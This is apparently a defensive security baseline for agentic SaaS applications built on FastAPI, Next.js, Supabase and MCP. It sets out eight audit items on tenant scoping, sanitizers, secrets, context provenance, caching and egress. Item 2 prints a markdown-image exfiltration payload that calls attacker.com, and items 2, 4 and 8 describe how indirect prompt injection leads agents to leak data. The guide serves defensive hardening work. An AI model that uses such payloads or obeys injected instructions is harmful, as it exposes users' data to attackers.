# The v0 baseline

Eight items every agentic SaaS application should clear before a sophisticated prospect's security review. A structural audit, not a compliance checklist. These are exploitable, fixable in a sprint, and visible to anyone who looks.

Stack in scope: FastAPI + PostgreSQL, Next.js + Vercel AI SDK + Supabase, MCP servers. Examples throughout are drawn from these stacks.

What this baseline can verify: items 1, 3, 5, and 6 are fully static-catchable. Items 2, 4, 7, and 8 have components that require behavioral or adversarial verification. The static pass on those items is necessary, not sufficient.

Run the audit mechanically with the [lint-baseline skill →].

## 1. Tenant DB queries route through a scoped helper, not raw .get(id) on tenant-scoped models

**Why it's ship-blocking.** Agents generate queries every request. If they can fetch any object by ID without a tenant predicate, they will, and cross-tenant leakage looks indistinguishable from normal usage until a breach surfaces it. This is OWASP API Security #1 (Broken Object Level Authorization), compounded by a model that forgets the filter every invocation.

**What the gap looks like.**

- FastAPI: `project = await session.get(Project, project_id)` in a route handler with no tenant predicate.
- Next.js / Supabase: `createClient(url, SERVICE_ROLE_KEY)` in a server action (bypasses RLS entirely by design).
- Background workers: Celery task running a query without `SET LOCAL app.current_tenant = ?` on the connection.

**What passing looks like.**

*Static.* All reads on tenant-scoped models go through a helper that enforces `WHERE tenant_id = current_tenant_id()`. `ENABLE ROW LEVEL SECURITY` is present on all multi-tenant tables in migrations. The `service_role` key appears only in files flagged as admin-only.

*Behavioral.* RLS policy logic is correct (an `OR true` policy passes static but leaks everything). The connection pool reliably propagates `app.current_tenant`. The helper cannot be bypassed by passing a tenant ID from the request body. These require adversarial testing.

## 2. An HTML sanitizer runs on every path that renders LLM output as markdown or HTML

**Why it's ship-blocking.** LLM output is untrusted content. A reference-style markdown image — `![x][1]\n[1]: https://attacker.com?data=...` — fetches automatically when the client renders it, exfiltrating whatever the model saw. This attack class has appeared in production across ChatGPT, Bing Chat, GitHub Copilot, and Microsoft 365 Copilot (CVE-2025-32711, CVSS 9.3).

**What the gap looks like.**

- Next.js: `<ReactMarkdown>{llmOutput}</ReactMarkdown>` with no `rehype-sanitize` or equivalent.
- FastAPI / Jinja: `{{ llm_response | safe }}` in a template.
- MCP: a tool result containing attacker-controlled markdown passed directly to the host renderer without sanitization.

**What passing looks like.**

*Static.* Every path from model response to render passes through DOMPurify, `rehype-sanitize`, or `bleach` (deprecated since January 2023; prefer `nh3` for new Python projects). No `dangerouslySetInnerHTML`, `|safe`, or `{@html}` is applied to LLM output without an explicit sanitizer call upstream.

*Behavioral.* The sanitizer handles reference-style markdown links and images (the EchoLeak exfiltration vector). `CSP img-src` is restricted to same-origin or a tight allowlist. Static confirms the sanitizer exists. It cannot confirm these specific cases pass. Test with reference-style payloads before claiming this item clear.

Item 5 sweeps for the same primitives across the whole codebase, regardless of whether LLM output currently reaches them. Both checks are necessary.

## 3. OAuth tokens and API keys live in vault or env, not database columns

**Why it's ship-blocking.** Long-lived credentials in the database become the prize of every SQL injection, backup leak, and read-replica misconfiguration. An agent holding user tokens can be prompted to use them. The blast radius scales with whatever those tokens authorize.

**What the gap looks like.**

- SQLAlchemy column named `refresh_token TEXT` or `api_key TEXT` without column-level encryption.
- Supabase: per-user OAuth tokens in a row that any RLS bypass exposes. New Supabase projects (post-Nov 2025) use `sb_secret_*` keys in place of legacy `service_role` JWTs — treat as equally sensitive.
- MCP config: Stripe, GitHub, or OpenAI key in a plaintext config file committed or present in the repo root.

**What passing looks like.**

*Static.* No ORM column named `*_token`, `*_secret`, `*_key`, or `*_api_key` without an encryption decorator. No AWS, Stripe, GitHub, or OpenAI key-shaped strings in source outside test fixtures. Credentials are read from a secrets manager client or environment variable, not from a DB query result.

*Behavioral.* Secrets manager is correctly configured and keys are rotated. Static cannot verify this.

## 4. Agent context is built from typed messages with provenance tags, not flat-string concatenation

**Why it's ship-blocking.** Without provenance, the model cannot distinguish instructions from the user from instructions embedded in a retrieved document. Indirect prompt injection has produced data exfiltration in production across every major LLM platform since 2023. After "The Attacker Moves Second" (Nasr et al., 2025) broke every published classifier-based defense under adaptive attack, structural context separation, not filtering, became the load-bearing control.

**What the gap looks like.**

- LangGraph: `prompt = f"{system}\n\nContext: {retrieved_doc}\n\n{user_q}"`. Provenance is destroyed at concatenation.
- Vercel AI SDK: RAG context stuffed into the system message as raw markdown, mixed with trusted instructions.
- LangChain: `PromptTemplate` with a retriever-filled variable passed directly to the model without a trust delimiter.

**What passing looks like.**

*Static.* LLM calls use typed message objects with distinct sources. No f-string or `+` concatenation of trusted instructions with retrieval results. Untrusted content is wrapped with unambiguous delimiters before reaching the model.

*Behavioral.* Whether the separation is enforced at every flatten path. Whether the model honors provenance tags under adversarial prompts. Spotlighting raises attacker cost but does not eliminate the exposure. Test with indirect-injection payloads using promptfoo or garak.

## 5. All uses of dangerouslySetInnerHTML, |safe, and raw markdown renderers are documented and sanitizer-covered

**Why it's ship-blocking.** These APIs exist specifically to bypass framework auto-escaping. Their presence anywhere means untrusted content can reach them, now or when a future engineer adds an LLM-output path without noticing the existing escape hatch. A latent primitive is a ticking finding.

**What the gap looks like.**

- React: `dangerouslySetInnerHTML={{ __html: content }}`.
- Jinja / Python: `{{ output | safe }}` or `Markup(user_value)`.
- Vue: `v-html="content"`. Svelte: `{@html content}`.
- `react-markdown` or `marked` imported without `rehype-sanitize` or DOMPurify in the same module.

**What passing looks like.**

*Static.* None of the above patterns appear outside a documented, audited allowlist with explicit justification per call site.

*Behavioral.* Not applicable. This item is fully static-verifiable.

## 6. Observability SDKs are initialized with redaction; tool returns do not contain credentials

**Why it's ship-blocking.** Langfuse, LangSmith, and Phoenix log every prompt, every tool input, and every tool output by default. The trace store becomes a searchable copy of every credential, PII record, and internal endpoint the agent ever saw. The store is accessible to anyone with dashboard access or a compromised observability key.

**What the gap looks like.**

- Langfuse SDK initialized without a `mask` callback.
- LangSmith `Client(` without `hide_inputs`/`hide_outputs`, or `@traceable` without `process_inputs`/`process_outputs`.
- FastAPI / LangGraph tool returning `response.text` directly, which may contain `Authorization` headers or API keys in URL parameters.

**What passing looks like.**

*Static.* Every observability SDK initialization in the codebase includes a redaction callback. Tool result handlers strip credential-shaped patterns before returning. No function named `*_token` or `*_secret` returns its full input in error messages.

*Behavioral.* Whether the redaction masks all live secret formats. JWTs, opaque tokens, and unusual key patterns can slip through a pattern-matched filter. Verify by replaying a sample of traces through a credential scanner (trufflehog or gitleaks).

## 7. Caches are keyed by (tenant_id, …), not query content alone

**Why it's ship-blocking.** A cache key that omits tenant ID serves tenant A's response to tenant B on a repeated query. With semantic caches, an attacker can craft a query that collides with a victim's cached response without being authenticated. Published research has demonstrated high response-hijacking rates against production semantic-cache deployments.

**What the gap looks like.**

- Redis: `SETEX cache:${hash(query)} response` without a tenant prefix.
- Next.js: `unstable_cache` on a server action wrapping an LLM call, keyed only by query content.
- GPTCache or Redis Vector with similarity-threshold matching and no per-tenant namespace.

**What passing looks like.**

*Static.* Cache key derivation in all cache decorator usages includes a tenant or user identifier. No semantic cache library import without a documented per-tenant namespace strategy.

*Behavioral.* Whether the similarity threshold is tight enough to prevent cross-tenant collision. Whether embedding collisions are likely on the corpus. These require adversarial testing against actual cache entries.

## 8. The agent worker has an egress allowlist; no untyped fetch_url or open-web tools without confirmation

**Why it's ship-blocking.** Without an egress allowlist, every other control has to hold. If prompt injection reaches the model and the context window contains sensitive data, item 8 is what prevents exfiltration. With one, the blast radius of a successful injection is bounded to whatever is allowlisted. Every public prompt-injection exfiltration incident since 2023 required an egress vector the agent worker could reach.

**What the gap looks like.**

- LangGraph tool: `requests.get(url)` where `url` is a model-produced value with no allowlist check.
- MCP server: `web_fetch` tool accepting any URL without host validation.
- Image rendering in the client. Even without a fetch tool, an `<img>` in the response is an egress channel. Item 8 and item 2 are co-dependent. Passing one without the other does not block exfiltration.

**What passing looks like.**

*Static.* URL-parameter tool definitions use typed or validated parameters, or an adjacent allowlist constant, rather than `url: str` with no constraint. Tools named `fetch_url`, `web_search`, `browse`, or `http_request` have an explicit `ALLOWED_HOSTS` constant. LangChain `RequestsGetTool` or equivalent includes `allowed_hosts`.

*Behavioral.* Whether network egress is constrained at the OS, container, or VPC level. Static cannot verify this. It requires a runtime probe: attempt to reach an external host from the worker. If it succeeds, this item fails regardless of application-level allowlists. The strictest passing state is network-policy enforcement, not application-code enforcement.

## What "behavioral eval required" means

Items 2, 4, 7, and 8 include behavioral components that static analysis cannot confirm. A static pass on these items means the right structure is in place. It does not mean the control works under adversarial conditions. Behavioral verification means running a targeted adversarial test against the specific component.

The relevant tools:

- **promptfoo**: adversarial eval for items 2 and 4 (prompt injection, indirect injection, markdown exfiltration payloads).
- **garak**: LLM vulnerability probes for item 4.
- **Runtime egress probe**: for item 8. Attempt to reach an external host from the agent worker process.

## What this baseline does not cover

CI/CD hygiene, GitHub Actions security, secrets sprawl, cloud config, and dependency scanning are covered by the operational companion (opsec-baseline). Dependency CVEs, supply chain, and training infrastructure are out of scope by design. These exclusions are deliberate. This baseline covers only the attack surface created by the agentic application layer itself.

Run the [lint-baseline skill →] for a mechanical audit against these criteria, including framework-specific findings for FastAPI, Next.js, Supabase, and MCP server integration patterns.
